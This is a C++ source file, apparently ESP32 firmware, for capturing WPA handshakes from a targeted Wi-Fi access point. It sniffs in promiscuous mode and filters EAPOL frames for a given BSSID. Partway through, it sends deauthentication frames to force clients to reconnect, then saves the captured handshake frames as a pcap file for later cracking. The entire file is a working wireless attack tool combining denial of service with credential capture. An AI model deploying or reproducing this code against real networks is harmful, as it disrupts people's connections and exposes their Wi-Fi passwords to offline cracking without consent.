#include "handshake_capture.h"
#include "config.h"
#include "mac_utils.h"
#include "deauth.h"

#include <LittleFS.h>
#include <esp_wifi.h>

namespace {

volatile bool g_capturing = false;
uint8_t g_targetBssid[6];

constexpr int MAX_FRAMES = 8;
constexpr size_t MAX_FRAME_LEN = 300;

struct CapturedFrame {
    uint16_t len;
    uint8_t data[MAX_FRAME_LEN];
};

CapturedFrame g_frames[MAX_FRAMES];
volatile int g_frameCount = 0;

void IRAM_ATTR eapolPromiscCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_capturing || g_frameCount >= MAX_FRAMES) return;
    if (type != WIFI_PKT_DATA) return;

    auto *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 || len > MAX_FRAME_LEN) return;

    const uint8_t *addr1 = pkt->payload + 4;
    const uint8_t *addr2 = pkt->payload + 10;
    const uint8_t *addr3 = pkt->payload + 16;
    bool involvesBssid = memcmp(addr1, g_targetBssid, 6) == 0 ||
                          memcmp(addr2, g_targetBssid, 6) == 0 ||
                          memcmp(addr3, g_targetBssid, 6) == 0;
    if (!involvesBssid) return;

    uint8_t fc0 = pkt->payload[0];
    uint8_t fc1 = pkt->payload[1];
    uint8_t frameType = (fc0 >> 2) & 0x03;
    uint8_t subtype = (fc0 >> 4) & 0x0F;
    if (frameType != 2) return;

    bool toDS = fc1 & 0x01;
    bool fromDS = fc1 & 0x02;
    bool qos = subtype & 0x08;
    uint16_t macHdrLen = 24;
    if (toDS && fromDS) macHdrLen += 6;
    if (qos) macHdrLen += 2;
    if (len < (uint16_t)(macHdrLen + 8)) return;

    const uint8_t *llc = pkt->payload + macHdrLen;
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03 || llc[6] != 0x88 || llc[7] != 0x8E) return;

    CapturedFrame &f = g_frames[g_frameCount];
    f.len = len;
    memcpy(f.data, pkt->payload, len);
    g_frameCount++;
}

void writePcapHeader(File &f) {
    uint8_t hdr[24];
    uint32_t magic = 0xa1b2c3d4, sigfigs = 0, snaplen = 65535, network = 105;
    uint16_t verMajor = 2, verMinor = 4;
    int32_t thisZone = 0;
    memcpy(hdr + 0, &magic, 4);
    memcpy(hdr + 4, &verMajor, 2);
    memcpy(hdr + 6, &verMinor, 2);
    memcpy(hdr + 8, &thisZone, 4);
    memcpy(hdr + 12, &sigfigs, 4);
    memcpy(hdr + 16, &snaplen, 4);
    memcpy(hdr + 20, &network, 4);
    f.write(hdr, sizeof(hdr));
}

void writePcapPacket(File &f, const uint8_t *data, uint16_t len, uint32_t tsSec, uint32_t tsUsec) {
    uint8_t rec[16];
    uint32_t inclLen = len, origLen = len;
    memcpy(rec + 0, &tsSec, 4);
    memcpy(rec + 4, &tsUsec, 4);
    memcpy(rec + 8, &inclLen, 4);
    memcpy(rec + 12, &origLen, 4);
    f.write(rec, sizeof(rec));
    f.write(data, len);
}

} // namespace

namespace HandshakeCapture {

Result capture(const String &bssidStr, uint8_t channel, uint32_t durationMs) {
    Result result{"", 0};
    if (!MacUtils::parse(bssidStr, g_targetBssid)) return result;

    g_frameCount = 0;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(&eapolPromiscCb);
    g_capturing = true;
    esp_wifi_set_promiscuous(true);

    uint32_t start = millis();
    uint32_t deauthAt = start + durationMs / 3;
    bool deauthSent = false;
    while (millis() - start < durationMs) {
        if (!deauthSent && millis() >= deauthAt) {
            Deauth::send(bssidStr, "", channel, 10);
            deauthSent = true;
        }
        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    g_capturing = false;

    if (g_frameCount == 0) return result;

    if (!LittleFS.exists(HANDSHAKE_CAPTURE_DIR)) LittleFS.mkdir(HANDSHAKE_CAPTURE_DIR);
    String safeBssid = bssidStr;
    safeBssid.replace(":", "");
    String path = String(HANDSHAKE_CAPTURE_DIR) + "/" + safeBssid + "_" + String(millis()) + ".pcap";
    File f = LittleFS.open(path, FILE_WRITE);
    if (!f) return result;

    writePcapHeader(f);
    uint32_t nowSec = millis() / 1000;
    for (int i = 0; i < g_frameCount; i++) {
        writePcapPacket(f, g_frames[i].data, g_frames[i].len, nowSec, (millis() % 1000) * 1000);
    }
    f.close();

    result.filePath = path;
    result.eapolFrames = g_frameCount;
    return result;
}

} // namespace HandshakeCapture
